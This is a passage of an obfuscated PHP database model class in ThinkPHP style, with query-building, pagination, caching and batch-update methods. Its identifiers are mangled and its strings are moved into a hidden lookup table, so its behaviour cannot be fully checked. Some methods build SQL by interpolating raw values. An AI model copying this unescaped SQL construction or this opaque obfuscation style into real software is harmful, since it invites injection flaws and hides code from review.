$‘Ï©ÅÉ[$¬¶¶¨»Ç] = Db::getInstance($˜œ§ĞÂØ); } elseif (NULL === $˜œ§ĞÂØ) { $‘Ï©ÅÉ[$¬¶¶¨»Ç]->close(); unset($‘Ï©ÅÉ[$¬¶¶¨»Ç]); return; } if (!empty($ğôõ·§İ)) { if (is_string($ğôõ·§İ)) { parse_str($ğôõ·§İ, $ğôõ·§İ); } foreach ($ğôõ·§İ as $Ä‡Æ¥È => $ã“òçÜ) { $this->setProperty($Ä‡Æ¥È, $ã“òçÜ); } } $µü¬‰¤ì[$¬¶¶¨»Ç] = $˜œ§ĞÂØ; $this->db = $‘Ï©ÅÉ[$¬¶¶¨»Ç]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $‘«Âğšœ = get_class($this); if ($‘«Âğšœ == $_SERVER[®»±”ó²][423]) { return $this->name; } $this->name = substr($‘«Âğšœ, 0, -5); } return $this->name; } public function getTableName() { $¡±”ğâ =& $_SERVER[®»±”ó²]; if (empty($this->trueTableName)) { $×¾ö–¦× = !empty($this->tablePrefix) ? $this->tablePrefix : $¡±”ğâ[12]; if (!empty($this->tableName)) { $×¾ö–¦× .= $this->tableName; } else { $×¾ö–¦× .= think_parse_name($this->name); } $this->trueTableName = strtolower($×¾ö–¦×); } return (!empty($this->dbName) ? $this->dbName . $¡±”ğâ[10] : $¡±”ğâ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ÛÖ¼²ÜÓ =& $_SERVER[®»±”ó²]; return isset($this->fields[$ÛÖ¼²ÜÓ[331]]) ? $this->fields[$ÛÖ¼²ÜÓ[331]] : $this->pk; } public function getDbFields() { $ı…ñ™ª =& $_SERVER[®»±”ó²]; if (isset($this->options[$ı…ñ™ª[359]])) { $Öèñ–ã„ = $this->db->getFields($this->options[$ı…ñ™ª[359]]); return $Öèñ–ã„ ? array_keys($Öèñ–ã„) : !1; } if ($this->fields) { $Öèñ–ã„ = $this->fields; unset($Öèñ–ã„[$ı…ñ™ª[330]], $Öèñ–ã„[$ı…ñ™ª[331]], $Öèñ–ã„[$ı…ñ™ª[332]], $Öèñ–ã„[$ı…ñ™ª[329]]); return $Öèñ–ã„; } return !1; } public function data($Áò±®¡Ã = '') { $ÛØ€ç¿¤ =& $_SERVER[®»±”ó²]; if ($ÛØ€ç¿¤[12] === $Áò±®¡Ã && !empty($this->data)) { return $this->data; } if (is_object($Áò±®¡Ã)) { $Áò±®¡Ã = get_object_vars($Áò±®¡Ã); } elseif (is_string($Áò±®¡Ã)) { parse_str($Áò±®¡Ã, $Áò±®¡Ã); } elseif (!is_array($Áò±®¡Ã)) { think_exception(think_lang($ÛØ€ç¿¤[351])); } $this->data = $Áò±®¡Ã; return $this; } public function join($øÏÕ¼»”) { $€¤è“í› =& $_SERVER[®»±”ó²]; if (is_array($øÏÕ¼»”)) { $this->options[$€¤è“í›[362]] = $øÏÕ¼»”; } elseif (!empty($øÏÕ¼»”)) { $this->options[$€¤è“í›[362]][] = $øÏÕ¼»”; } return $this; } public function union($¾…‹ô, $èİØÌî‰ = false) { $ãøß˜Ğ¢ =& $_SERVER[®»±”ó²]; if (empty($¾…‹ô)) { return $this; } if ($èİØÌî‰) { $this->options[$ãøß˜Ğ¢[424]][$ãøß˜Ğ¢[425]] = !0; } if (is_object($¾…‹ô)) { $¾…‹ô = get_object_vars($¾…‹ô); } if (is_string($¾…‹ô)) { $İáàËÇ© = $¾…‹ô; } elseif (is_array($¾…‹ô)) { if (isset($¾…‹ô[0])) { $this->options[$ãøß˜Ğ¢[424]] = array_merge($this->options[$ãøß˜Ğ¢[424]], $¾…‹ô); return $this; } else { $İáàËÇ© = $¾…‹ô; } } else { think_exception(think_lang($ãøß˜Ğ¢[351])); } $this->options[$ãøß˜Ğ¢[424]][] = $İáàËÇ©; return $this; } public function cache($©”Â»—ñ = true, $‘¤±Íë÷ = null, $©Â¸Æ‡Á = '') { $û÷ëå¬Ë =& $_SERVER[®»±”ó²]; if (!1 !== $©”Â»—ñ) { $this->options[$û÷ëå¬Ë[426]] = array($û÷ëå¬Ë[97] => $©”Â»—ñ, $û÷ëå¬Ë[416] => $‘¤±Íë÷, $û÷ëå¬Ë[33] => $©Â¸Æ‡Á); } return $this; } public function field($µÇé‰ˆÉ, $½êÁê¡ª = false) { $îÌˆæ– =& $_SERVER[®»±”ó²]; if (!0 === $µÇé‰ˆÉ) { $òÒóÙ£ò = $this->getDbFields(); $µÇé‰ˆÉ = $òÒóÙ£ò ? $òÒóÙ£ò : $îÌˆæ–[223]; } elseif ($½êÁê¡ª) { if (is_string($µÇé‰ˆÉ)) { $µÇé‰ˆÉ = explode($îÌˆæ–[50], $µÇé‰ˆÉ); } $òÒóÙ£ò = $this->getDbFields(); $µÇé‰ˆÉ = $òÒóÙ£ò ? array_diff($òÒóÙ£ò, $µÇé‰ˆÉ) : $µÇé‰ˆÉ; } $this->options[$îÌˆæ–[353]] = $µÇé‰ˆÉ; return $this; } public function scope($—öŸ¸ô‘ = '', $š¢¨¥ ­ = NULL) { $ ú«ù¶Á =& $_SERVER[®»±”ó²]; if ($ ú«ù¶Á[12] === $—öŸ¸ô‘) { if (isset($this->_scope[$ ú«ù¶Á[37]])) { $ó÷Ó‘‰Ì = $this->_scope[$ ú«ù¶Á[37]]; } else { return $this; } } elseif (is_string($—öŸ¸ô‘)) { $¸Ó•Å€Õ = explode($ ú«ù¶Á[50], $—öŸ¸ô‘); $ó÷Ó‘‰Ì = array(); foreach ($¸Ó•Å€Õ as $Ä™Å¾®ë) { if (!isset($this->_scope[$Ä™Å¾®ë])) { continue; } $ó÷Ó‘‰Ì = array_merge($ó÷Ó‘‰Ì, $this->_scope[$Ä™Å¾®ë]); } if (!empty($š¢¨¥ ­) && is_array($š¢¨¥ ­)) { $ó÷Ó‘‰Ì = array_merge($ó÷Ó‘‰Ì, $š¢¨¥ ­); } } elseif (is_array($—öŸ¸ô‘)) { $ó÷Ó‘‰Ì = $—öŸ¸ô‘; } if (is_array($ó÷Ó‘‰Ì) && !empty($ó÷Ó‘‰Ì)) { $this->options = array_merge($this->options, array_change_key_case($ó÷Ó‘‰Ì)); } return $this; } public function where($öÕ–µï•, $°‡¬È¶ = null) { $®ÛÔáÙ“ =& $_SERVER[®»±”ó²]; if (!is_null($°‡¬È¶) && is_string($öÕ–µï•)) { if (!is_array($°‡¬È¶)) { $°‡¬È¶ = func_get_args(); array_shift($°‡¬È¶); } $°‡¬È¶ = array_map(array($this->db, $®ÛÔáÙ“[420]), $°‡¬È¶); $öÕ–µï• = vsprintf($öÕ–µï•, $°‡¬È¶); } elseif (is_object($öÕ–µï•)) { $öÕ–µï• = get_object_vars($öÕ–µï•); } elseif (is_array($öÕ–µï•)) { foreach ($öÕ–µï• as $È·´ÊÈ› => $·ÈÏËÒ) { if ((is_numeric($È·´ÊÈ›) || !$È·´ÊÈ›) && is_string($·ÈÏËÒ)) { if (strpos($·ÈÏËÒ, $®ÛÔáÙ“[427]) === 0) { continue; } think_trace($®ÛÔáÙ“[428], $®ÛÔáÙ“[12], $®ÛÔáÙ“[49]); die; } } } if (is_string($öÕ–µï•) && $®ÛÔáÙ“[12] != $öÕ–µï•) { $Ôµî­»ô = array(); $Ôµî­»ô[$®ÛÔáÙ“[429]] = $öÕ–µï•; $öÕ–µï• = $Ôµî­»ô; } if (isset($this->options[$®ÛÔáÙ“[355]])) { $this->options[$®ÛÔáÙ“[355]] = array_merge($this->options[$®ÛÔáÙ“[355]], $öÕ–µï•); } else { $this->options[$®ÛÔáÙ“[355]] = $öÕ–µï•; } return $this; } public function limit($÷¥“Êñš, $ª¾Æ½‚õ = null) { $Öšòš” =& $_SERVER[®»±”ó²]; $this->options[$Öšòš”[370]] = is_null($ª¾Æ½‚õ) ? $÷¥“Êñš : $÷¥“Êñš . $Öšòš”[50] . $ª¾Æ½‚õ; return $this; } public function page($™Ü¯Ú¢Ä, $èä¤üãø = null) { $ƒ¡×¨ÓÀ =& $_SERVER[®»±”ó²]; $this->options[$ƒ¡×¨ÓÀ[430]] = is_null($èä¤üãø) ? $™Ü¯Ú¢Ä : $™Ü¯Ú¢Ä . $ƒ¡×¨ÓÀ[50] . $èä¤üãø; return $this; } public function comment($¯µÒª´Æ) { $this->options[$_SERVER[®»±”ó²][431]] = $¯µÒª´Æ; return $this; } public function setProperty($ƒš®›ÅÊ, $¦¦˜á ) { if (property_exists($this, $ƒš®›ÅÊ)) { $this->{$ƒš®›ÅÊ} = $¦¦˜á ; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\x64\151\146\171\x54\151\155\x65", "\x74\151\x6d\145", "\151\x6e\163\x65\162\164\54\165\160\144\141\x74\145", "\146\165\x6e\x63\164\151\x6f\x6e"), array("\143\162\145\x61\x74\x65\124\151\155\x65", "\x74\151\155\x65", "\151\x6e\163\145\x72\164", "\146\165\156\x63\164\151\x6f\x6e")); public function setDataAuto($‰àƒâ•) { $this->dataAuto = $‰àƒâ•; } public function __construct($Ï¬§èØ² = '', $ıˆŞ¹Î = '', $Ïö™¯¾¤ = '') { parent::__construct($Ï¬§èØ², $ıˆŞ¹Î, $Ïö™¯¾¤); } protected $tableMeta = array(); protected function _beforeInsert(&$µ˜ÊÅµ¦, $»º˜ËõÅ) { $îÙ¨²æ´ =& $_SERVER[®»±”ó²]; if (!$this->checkDataAutoHas($îÙ¨²æ´[432])) { return; } $this->dataBeforeFilter($µ˜ÊÅµ¦, $îÙ¨²æ´[432]); } protected function _beforeUpdate(&$¦Ş³ñò«, $¥Â»ó»­) { $¨‘ü×éÂ =& $_SERVER[®»±”ó²]; if (!$this->checkDataAutoHas($¨‘ü×éÂ[433])) { return; } $this->dataBeforeFilter($¦Ş³ñò«, $¨‘ü×éÂ[433]); } protected function _afterSelect(&$ñ–»Íšé, $Õµ³) { if (!is_array($ñ–»Íšé)) { return; } if (!$this->checkDataAutoHas($_SERVER[®»±”ó²][434])) { return; } foreach ($ñ–»Íšé as &$»·ö¶¨) { $this->dataAfterFilter($»·ö¶¨); } unset($»·ö¶¨); } protected function _afterFind(&$ÃãÍÏ¾à, $Ê´½»úî) { if (!is_array($ÃãÍÏ¾à)) { return; } if (!$this->checkDataAutoHas($_SERVER[®»±”ó²][434])) { return; } $this->dataAfterFilter($ÃãÍÏ¾à); } public static function textEncode($ç¾Ø¼Î) { if (!$ç¾Ø¼Î) { return $ç¾Ø¼Î; } $¶¸Ğ¶Œ· = json_encode($ç¾Ø¼Î); $¶¸Ğ¶Œ· = preg_replace_callback($_SERVER[®»±”ó²][435], function ($»€îÃ—›) { return addslashes($»€îÃ—›[0]); }, $¶¸Ğ¶Œ·); return json_decode($¶¸Ğ¶Œ·); } public static function textDecode($ß½‰‹øó) { $ÍÑèØŠé =& $_SERVER[®»±”ó²]; $øÖÁÑî = json_encode($ß½‰‹øó); $øÖÁÑî = preg_replace_callback($ÍÑèØŠé[436], function ($Ô©†ëÜô) { return $_SERVER[®»±”ó²][100]; }, $øÖÁÑî); return json_decode($øÖÁÑî); } public function setAutoIncrement($¯ÀäÁ¸×) { $¬óÉ¿Ú— = array($this->getPk() => $¯ÀäÁ¸×); $¹­…§ø– = $this->data($¬óÉ¿Ú—)->add(); if ($¹­…§ø–) { $this->delete($¹­…§ø–); } } public function getAutoIncrement() { $øÇÇá“  = $this->getTableName(); $˜ˆ’ªù‡ = $this->max($this->getPk()); $áÎîÉÆÉ = $this->query("\x73\x68\157\x77\x20\164\x61\142\154\145\40\x73\164\141\x74\x75\x73\40\x77\150\145\162\x65\x20\x4e\141\155\145\75\x27{$øÇÇá“ }\x27"); $ıÊ¾·¬§ = $áÎîÉÆÉ[0][$_SERVER[®»±”ó²][437]]; $×ƒ±âÇû = max($˜ˆ’ªù‡, $ıÊ¾·¬§); return $×ƒ±âÇû; } protected function _callBefore($Úšş±¼Ñ, $øšæø¯ä) { return $this->cacheCallCheck($Úšş±¼Ñ, $øšæø¯ä, !1); } protected function _callAfter($…›Òû, $¿åü¿×ú) { return $this->cacheCallCheck($…›Òû, $¿åü¿×ú, !0); } protected function cacheFunctionAlias($ÙÂµ†Á) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($¸ë˜ıçà, $×ñÛŸ§¨, $¡Õˆ¨“© = false) { $ğ¯¶ùˆ =& $_SERVER[®»±”ó²]; $–¥¾ê…¦ = $this->cacheFunctionAlias($×ñÛŸ§¨); if (!$–¥¾ê…¦) { return; } foreach ($–¥¾ê…¦ as $£ÇèÔª½ => $ò¹‰Èúù) { $’ù¾ç©İ = $ò¹‰Èúù[0]; $ûÉœ¤„ú = explode($ğ¯¶ùˆ[50], $ò¹‰Èúù[1]); $á±‚ığ— = isset($ò¹‰Èúù[2]) ? $ò¹‰Èúù[2] : $ğ¯¶ùˆ[12]; if ($¸ë˜ıçà == $£ÇèÔª½) { return $this->cacheFunctionGet($£ÇèÔª½, $’ù¾ç©İ, $á±‚ığ—); } if ($¡Õˆ¨“© && in_array($¸ë˜ıçà, $ûÉœ¤„ú)) { $this->cacheFunctionClear($£ÇèÔª½, $’ù¾ç©İ, $á±‚ığ—); } } } public function cacheFunctionGet($ü¤µ¹ä™, $ÁúèĞÒ¹, $¯ôµïÁ¹ = '') { $±§Üš•˜ = $this->cacheKeyMake($ü¤µ¹ä™, $ÁúèĞÒ¹, $¯ôµïÁ¹); $©æÅù×ñ = Cache::get($±§Üš•˜); if (!is_array($©æÅù×ñ)) { $©æÅù×ñ = call_user_func_array(array($this, $ü¤µ¹ä™), array($ÁúèĞÒ¹, !0)); Cache::set($±§Üš•˜, $©æÅù×ñ); } return $©æÅù×ñ; } public function cacheFunctionClear($µüÄÕÆ, $€Ë÷·š«, $¯¸Ü’”« = '') { $ğÔ“§êÓ = $€Ë÷·š«; if (!is_array($€Ë÷·š«)) { $ğÔ“§êÓ = array($€Ë÷·š«); } foreach ($ğÔ“§êÓ as $°²Ä³›) { $¿ò÷¯Ãş = $this->cacheKeyMake($µüÄÕÆ, $°²Ä³›, $¯¸Ü’”«); Cache::remove($¿ò÷¯Ãş); } } public function cacheKeyMake($ÂÔñëÎ, $‡¾Š“Ğ, $ñØÁ˜íß) { $úüßÜüß =& $_SERVER[®»±”ó²]; if ($ñØÁ˜íß) { $‡¾Š“Ğ = $‡¾Š“Ğ . $úüßÜüß[438] . $ñØÁ˜íß; } return get_class($this) . $úüßÜüß[11] . $ÂÔñëÎ . $úüßÜüß[439] . $‡¾Š“Ğ; } protected function selectPageReset() { $ØÏ®ˆÕ´ =& $_SERVER[®»±”ó²]; if (isset($GLOBALS[$ØÏ®ˆÕ´[440]])) { return; } $GLOBALS[$ØÏ®ˆÕ´[440]] = isset($GLOBALS[$ØÏ®ˆÕ´[7]][$ØÏ®ˆÕ´[441]]) ? $GLOBALS[$ØÏ®ˆÕ´[7]][$ØÏ®ˆÕ´[441]] : !1; $GLOBALS[$ØÏ®ˆÕ´[442]] = isset($GLOBALS[$ØÏ®ˆÕ´[7]][$ØÏ®ˆÕ´[430]]) ? $GLOBALS[$ØÏ®ˆÕ´[7]][$ØÏ®ˆÕ´[430]] : !1; $GLOBALS[$ØÏ®ˆÕ´[7]][$ØÏ®ˆÕ´[441]] = !1; $GLOBALS[$ØÏ®ˆÕ´[7]][$ØÏ®ˆÕ´[430]] = !1; } protected function selectPageRestore() { $Õ÷‚ø÷ =& $_SERVER[®»±”ó²]; if (!isset($GLOBALS[$Õ÷‚ø÷[440]])) { return; } $GLOBALS[$Õ÷‚ø÷[7]][$Õ÷‚ø÷[441]] = $GLOBALS[$Õ÷‚ø÷[440]]; $GLOBALS[$Õ÷‚ø÷[7]][$Õ÷‚ø÷[430]] = $GLOBALS[$Õ÷‚ø÷[442]]; if ($GLOBALS[$Õ÷‚ø÷[7]][$Õ÷‚ø÷[441]] === !1) { unset($GLOBALS[$Õ÷‚ø÷[7]][$Õ÷‚ø÷[441]]); } if ($GLOBALS[$Õ÷‚ø÷[7]][$Õ÷‚ø÷[430]] === !1) { unset($GLOBALS[$Õ÷‚ø÷[7]][$Õ÷‚ø÷[430]]); } unset($GLOBALS[$Õ÷‚ø÷[440]]); unset($GLOBALS[$Õ÷‚ø÷[442]]); } protected function selectPage($°”£ã»á = 200, $ôÓû‘İ´ = 1) { $™Âİ…›İ =& $_SERVER[®»±”ó²]; global $in; $İÇãÙë = $this->optionsValue(); $“ˆÙÒŸö = 50000; $°”£ã»á = isset($in[$™Âİ…›İ[441]]) && $in[$™Âİ…›İ[441]] ? $in[$™Âİ…›İ[441]] : $°”£ã»á; if ($°”£ã»á === -1) { $in[$™Âİ…›İ[441]] = !1; $“ˆÙÒŸö = 100000000; $°”£ã»á = $“ˆÙÒŸö; } $´€°§‚ = $İÇãÙë; $´€°§‚[$™Âİ…›İ[443]] = array(); $°”£ã»á = intval($°”£ã»á); $°”£ã»á = $°”£ã»á <= 5 ? 5 : ($°”£ã»á >= $“ˆÙÒŸö ? $“ˆÙÒŸö : $°”£ã»á); $ôÓû‘İ´ = intval(isset($in[$™Âİ…›İ[430]]) && $in[$™Âİ…›İ[430]] ? $in[$™Âİ…›İ[430]] : $ôÓû‘İ´); $ôÓû‘İ´ = $ôÓû‘İ´ <= 1 ? 1 : $ôÓû‘İ´; $Ø´Áàç = array(); $ºƒË‚ƒ¹ = 1; if ($ôÓû‘İ´ == 1 && $ºƒË‚ƒ¹) { $this->optionsValue($İÇãÙë); $Ø´Áàç = $this->page($ôÓû‘İ´, $°”£ã»á)->select(); $Ìòªê = is_array($Ø´Áàç) ? count($Ø´Áàç) : 0; if ($Ìòªê < $°”£ã»á) { $Ò•ê»‡ê = 1; } else { $this->optionsValue($´€°§‚); $Ìòªê = intval($this->count()); $Ò•ê»‡ê = ceil($Ìòªê / $°”£ã»á); } } else { $this->optionsValue($´€°§‚); $Ìòªê = intval($this->count()); $Ò•ê»‡ê = ceil($Ìòªê / $°”£ã»á); $ôÓû‘İ´ = $ôÓû‘İ´ >= $Ò•ê»‡ê ? $Ò•ê»‡ê : $ôÓû‘İ´; $this->optionsValue($İÇãÙë); $Ø´Áàç = $this->page($ôÓû‘İ´, $°”£ã»á)->select(); } if (!is_array($Ø´Áàç)) { $Ø´Áàç = array(); } if ($Ò•ê»‡ê == 1) { $Ìòªê = count($Ø´Áàç); } $ÌËÄÈï± = array($™Âİ…›İ[444] => array($™Âİ…›İ[445] => $Ìòªê, $™Âİ…›İ[441] => $°”£ã»á, $™Âİ…›İ[430] => $ôÓû‘İ´, $™Âİ…›İ[446] => $Ò•ê»‡ê), $™Âİ…›İ[447] => $Ø´Áàç); return $ÌËÄÈï±; } protected function checkLength($š‚–§ş, $§¿ê¡ì = 0, $‰¬¦•ŞĞ = '') { $Ûœ°øˆù =& $_SERVER[®»±”ó²]; $§¿ê¡ì = $§¿ê¡ì ? $§¿ê¡ì : 65536; if (!$š‚–§ş || strlen($š‚–§ş) < $§¿ê¡ì) { return; } $‰¬¦•ŞĞ = $‰¬¦•ŞĞ ? $‰¬¦•ŞĞ . $Ûœ°øˆù[74] : $Ûœ°øˆù[12]; show_json($‰¬¦•ŞĞ . LNG($Ûœ°øˆù[448]) . "\x28{$§¿ê¡ì}\51", !1); } protected function metaSet($‡ãîê£, $»ïô„“¹ = null, $û»çû¬É = null) { $—±—åÕÑ =& $_SERVER[®»±”ó²]; if (!$this->tableMeta || !$‡ãîê£) { return !1; } $‹æûß»« = $this->tableMeta[$—±—åÕÑ[449]]; $ãôÜ¸Š = $this->tableMeta[$—±—åÕÑ[450]]; $ÚÏ×©Ó = Model($ãôÜ¸Š); $ãâÄ‡’ì = array($‹æûß»« => $‡ãîê£, $—±—åÕÑ[451] => $»ïô„“¹); if (is_null($»ïô„“¹)) { return $ÚÏ×©Ó->where(array($‹æûß»« => $‡ãîê£))->delete(); } if (is_null($û»çû¬É) && is_string($»ïô„“¹)) { return $ÚÏ×©Ó->where($ãâÄ‡’ì)->delete(); } $÷½µµ·– = is_array($»ïô„“¹) ? $»ïô„“¹ : array(); if (is_string($»ïô„“¹)) { $÷½µµ·–[$»ïô„“¹] = $û»çû¬É; } $‚¿»ó¼Î = array(); foreach ($÷½µµ·– as $š³Ò“õ => $­ı²ş¯Ä) { if (is_null($­ı²ş¯Ä) && is_string($š³Ò“õ)) { $ÚÏ×©Ó->where(array($‹æûß»« => $‡ãîê£, $—±—åÕÑ[451] => $š³Ò“õ))->delete(); continue; } $this->checkLength($­ı²ş¯Ä, !1, $ãôÜ¸Š . $—±—åÕÑ[4] . $š³Ò“õ); $‚¿»ó¼Î[] = array($‹æûß»« => $‡ãîê£, $—±—åÕÑ[97] => $š³Ò“õ, $—±—åÕÑ[452] => $­ı²ş¯Ä); } $şëÄÙç† = $—±—åÕÑ[453] . $ãôÜ¸Š; CacheLock::lock($şëÄÙç†); $ÚÏ×©Ó->where(array($‹æûß»« => $‡ãîê£))->addAll($‚¿»ó¼Î, array(), !0); CacheLock::unlock($şëÄÙç†); return !0; } public function metaGet($Ø©¶ò¡Ó, $³‡éÂ£ = false) { $îšÂãÔ¬ =& $_SERVER[®»±”ó²]; if (!$this->tableMeta) { return array(); } $ŞÅ˜Ÿ‡å = $this->tableMeta[$îšÂãÔ¬[449]]; $¢éÍ±â = Model($this->tableMeta[$îšÂãÔ¬[450]]); if ($³‡éÂ£) { $ß»­§Ò = array($ŞÅ˜Ÿ‡å => $Ø©¶ò¡Ó, $îšÂãÔ¬[97] => $³‡éÂ£); return $¢éÍ±â->where($ß»­§Ò)->getField($îšÂãÔ¬[452]); } $ß»­§Ò = array($ŞÅ˜Ÿ‡å => $Ø©¶ò¡Ó); $ê®ò  ô = $¢éÍ±â->field($îšÂãÔ¬[454])->where($ß»­§Ò)->select(); $ê®ò  ô = array_to_keyvalue($ê®ò  ô, $îšÂãÔ¬[97], $îšÂãÔ¬[452]); return $ê®ò  ô; } private function checkDataAutoHas($ô…ºù÷) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $óœ’‹•) { if (in_array($ô…ºù÷, explode($_SERVER[®»±”ó²][50], $óœ’‹•[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$°«Êõá, $à¡à Œ¢) { $ˆÄÄÈ¿Ï =& $_SERVER[®»±”ó²]; if (!is_array($°«Êõá)) { return; } foreach ($this->dataAuto as $­¶˜²Ïñ) { $û³»šÈ¶ = $­¶˜²Ïñ[0]; if (!in_array($à¡à Œ¢, explode($ˆÄÄÈ¿Ï[50], $­¶˜²Ïñ[2]))) { continue; } switch (trim($­¶˜²Ïñ[3])) { case $ˆÄÄÈ¿Ï[398]: case $ˆÄÄÈ¿Ï[399]: $÷œ¬÷Íº = $­¶˜²Ïñ[1]; $øÉÓ—¼á = isset($­¶˜²Ïñ[4]) ? (array) $­¶˜²Ïñ[4] : array(); if ($÷œ¬÷Íº == $ˆÄÄÈ¿Ï[207] && array_key_exists($û³»šÈ¶, $°«Êõá)) { if (!$°«Êõá[$û³»šÈ¶]) { unset($°«Êõá[$û³»šÈ¶]); } break; } if (isset($°«Êõá[$û³»šÈ¶])) { array_unshift($øÉÓ—¼á, $°«Êõá[$û³»šÈ¶]); } if ($ˆÄÄÈ¿Ï[398] == $­¶˜²Ïñ[3]) { $°«Êõá[$û³»šÈ¶] = call_user_func_array($÷œ¬÷Íº, $øÉÓ—¼á); } else { $°«Êõá[$û³»šÈ¶] = call_user_func_array(array(&$this, $÷œ¬÷Íº), $øÉÓ—¼á); } break; case $ˆÄÄÈ¿Ï[350]: if (isset($°«Êõá[$û³»šÈ¶]) && $°«Êõá[$û³»šÈ¶]) { $°«Êõá[$û³»šÈ¶] = call_user_func_array(array(&$this, $­¶˜²Ïñ[1]), array($°«Êõá[$û³»šÈ¶])); } break; case $ˆÄÄÈ¿Ï[353]: $°«Êõá[$û³»šÈ¶] = $°«Êõá[$­¶˜²Ïñ[1]]; break; case $ˆÄÄÈ¿Ï[371]: if (isset($°«Êõá[$û³»šÈ¶]) && !is_string($°«Êõá[$û³»šÈ¶])) { $°«Êõá[$û³»šÈ¶] = json_encode_force($°«Êõá[$û³»šÈ¶]); } break; case $ˆÄÄÈ¿Ï[400]: if ($°«Êõá[$û³»šÈ¶] === $ˆÄÄÈ¿Ï[12]) { unset($°«Êõá[$û³»šÈ¶]); } break; case $ˆÄÄÈ¿Ï[401]: $°«Êõá[$û³»šÈ¶] = $­¶˜²Ïñ[1]; default: break; } } if ($à¡à Œ¢ == $ˆÄÄÈ¿Ï[432]) { $İ÷òÌ÷Ì = strtolower($this->db->getDbType()); if (strpos($İ÷òÌ÷Ì, $ˆÄÄÈ¿Ï[13]) !== 0) { return; } $Û¦ˆÀ  = $this->field(!0)->fields; $¬Ñ“Áªû = $Û¦ˆÀ [$ˆÄÄÈ¿Ï[332]]; if (isset($Û¦ˆÀ [$ˆÄÄÈ¿Ï[331]])) { unset($¬Ñ“Áªû[$Û¦ˆÀ [$ˆÄÄÈ¿Ï[331]]]); } foreach ($¬Ñ“Áªû as $É¢’Ò†û => $à¡à Œ¢) { if (!isset($°«Êõá[$É¢’Ò†û])) { $°«Êõá[$É¢’Ò†û] = $ˆÄÄÈ¿Ï[12]; } } } } private function dataAfterFilter(&$¦˜¤¥ú) { $àÕÇÑØ =& $_SERVER[®»±”ó²]; foreach ($this->dataAuto as $œõ¤ê¦Û) { $Ãš¬“ = $œõ¤ê¦Û[0]; if (!isset($¦˜¤¥ú[$Ãš¬“])) { continue; } if (!in_array($àÕÇÑØ[434], explode($àÕÇÑØ[50], $œõ¤ê¦Û[2]))) { continue; } switch (trim($œõ¤ê¦Û[3])) { case $àÕÇÑØ[398]: case $àÕÇÑØ[399]: $»€ßÃœÊ = isset($œõ¤ê¦Û[4]) ? (array) $œõ¤ê¦Û[4] : array(); array_unshift($»€ßÃœÊ, $¦˜¤¥ú[$Ãš¬“]); if (isset($œõ¤ê¦Û[4]) && $œõ¤ê¦Û[4] == $àÕÇÑØ[455]) { $»€ßÃœÊ = array($¦˜¤¥ú[$Ãš¬“]); } if ($àÕÇÑØ[398] == $œõ¤ê¦Û[3]) { $¦˜¤¥ú[$Ãš¬“] = call_user_func_array($œõ¤ê¦Û[1], $»€ßÃœÊ); } else { $¦˜¤¥ú[$Ãš¬“] = call_user_func_array(array(&$this, $œõ¤ê¦Û[1]), $»€ßÃœÊ); } break; case $àÕÇÑØ[350]: if (isset($¦˜¤¥ú[$Ãš¬“]) && $¦˜¤¥ú[$Ãš¬“]) { $¦˜¤¥ú[$Ãš¬“] = call_user_func_array(array(&$this, $œõ¤ê¦Û[1]), array($¦˜¤¥ú[$Ãš¬“])); } break; case $àÕÇÑØ[353]: $¦˜¤¥ú[$Ãš¬“] = $¦˜¤¥ú[$œõ¤ê¦Û[1]]; break; case $àÕÇÑØ[371]: $ü›Şê« = $¦˜¤¥ú[$Ãš¬“]; $¦˜¤¥ú[$Ãš¬“] = json_decode($ü›Şê«, !0); if (is_null($¦˜¤¥ú[$Ãš¬“])) { $¦˜¤¥ú[$Ãš¬“] = $ü›Şê«; } break; case $àÕÇÑØ[400]: if ($¦˜¤¥ú[$Ãš¬“] === $àÕÇÑØ[12]) { unset($¦˜¤¥ú[$Ãš¬“]); } break; case $àÕÇÑØ[401]: $¦˜¤¥ú[$Ãš¬“] = $œõ¤ê¦Û[1]; break; default: break; } } } public function saveAll($ÚÔñßí©) { $ÇšÉ«êù =& $_SERVER[®»±”ó²]; $„‘†©§‚ = $this->tablePrefix . $this->tableName; $Ä£¨ìù¡ = self::SQL_WHERE_IN_CHUNK; $ÚÔñßí© = is_array($ÚÔñßí©) ? $ÚÔñßí© : array(); $”Ÿ÷¼Ê€ = $ÇšÉ«êù[456]; $ĞÆ€–³ï = 0; $ãÈ¬£óè = array(); $µşã•µï = count($ÚÔñßí©); for ($ıé¬¡Á· = 0; $ıé¬¡Á· < $µşã•µï; $ıé¬¡Á·++) { $ˆÈôë„² = $ÚÔñßí©[$ıé¬¡Á·]; if (!is_array($ˆÈôë„²) || count($ˆÈôë„²) != 4) { continue; } $œ¹É…Á = "\x55\120\104\101\x54\105\x20\140{$„‘†©§‚}\140\x20\123\105\x54\x20{$ˆÈôë„²[2]}\40\x3d\x20\x43\x41\123\105\x20{$ˆÈôë„²[0]}\40\xa"; if ($ĞÆ€–³ï == 0) { $”Ÿ÷¼Ê€ = $œ¹É…Á; } $ãÈ¬£óè[] = $ÇšÉ«êù[121] . $ˆÈôë„²[1] . $ÇšÉ«êù[121]; $ĞÆ€–³ï++; $”Ÿ÷¼Ê€ .= "\40\x57\110\x45\x4e\40\x27{$ˆÈôë„²[1]}\47\40\124\x48\105\x4e\40\x27{$ˆÈôë„²[3]}\x27\x20\xa"; if ($ĞÆ€–³ï == $Ä£¨ìù¡ || $ıé¬¡Á· == $µşã•µï - 1) { $Õ ÄÇ½ó = implode($ÇšÉ«êù[50], $ãÈ¬£óè); $”Ÿ÷¼Ê€ .= "\x20\x45\116\x44\40\x20\x57\110\x45\122\105\40{$ˆÈôë„²[0]}\40\x49\116\x20\50{$Õ ÄÇ½ó}\51\40"; $this->execute($”Ÿ÷¼Ê€); $ĞÆ€–³ï = 0; $”Ÿ÷¼Ê€ = $œ¹É…Á; 